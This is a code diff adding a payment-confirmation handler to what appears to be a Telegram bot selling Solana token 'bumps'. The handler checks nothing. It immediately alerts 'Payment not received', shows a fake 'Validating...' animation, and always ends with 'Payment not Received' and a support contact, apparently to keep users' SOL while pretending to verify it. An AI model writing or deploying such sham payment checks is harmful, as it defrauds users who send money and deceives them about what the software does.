@@ -2460,6 +2460,62 @@ Confirm payment Or choose Pay with Card or Pay with Coupon below
                
     # ↑↑↑ PASTE ENDS HERE ↑↑↑
 
+    elif query.data == 'bumpconfirm':
+        # Handle confirm payment for bumps
+        user_id = query.from_user.id
+        wallet_address = get_user_wallet(user_id)
+        
+        await query.answer(
+            text="❌ Payment not received.",
+            show_alert=True
+        )
+
+        # Check if the message has a photo
+        if query.message.photo:
+            # Photo message - send a new message
+            msg = await query.message.reply_text("<b>⏳ Validating Payment...</b>", parse_mode='HTML')
+        else:
+            # Text message - edit or send new
+            try:
+                await query.edit_message_text(
+                    "🔍 Checking payment status...",
+                    parse_mode='HTML'
+                )
+            except BadRequest as e:
+                print(f"Could not edit message: {e}")
+            msg = await query.message.reply_text("<b>⏳ Validating Payment...</b>", parse_mode='HTML')
+
+        # Animate with italic formatting
+        dots = ["⏳ <i>Validating</i>", "⏳ <i>Validating.</i>", "⏳ <i>Validating..</i>", "⏳ <i>Validating...</i>"]
+        final_message = "❌ <b>Payment not Received.</b>\n\nContact support if SOL was sent\n\n<b>Your wallet address:</b>\n<code>{wallet_address}</code>"
+        
+        try:
+            for i in range(12):  # 3 full cycles
+                await asyncio.sleep(0.2)
+                await msg.edit_text(f"<b>{dots[i % 4]}</b>", parse_mode='HTML')
+            
+            # Create keyboard with support contact
+            keyboard = [
+                [InlineKeyboardButton('📞 Contact Support', url='https://t.me/DELUGE_BUMP_SUPPORT')],
+                [InlineKeyboardButton('🔙 Back to Bump Menu', callback_data='startbump')],
+                [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await msg.edit_text(
+                final_message.format(wallet_address=wallet_address),
+                parse_mode='HTML',
+                reply_markup=reply_markup
+            )
+        except Exception as e:
+            print(f"Error in animation: {e}")
+            try:
+                await msg.edit_text(
+                    final_message.format(wallet_address=wallet_address),
+                    parse_mode='HTML'
+                )
+            except:
+                pass
         
     elif query.data == 'slow':
         # Get current SOL price
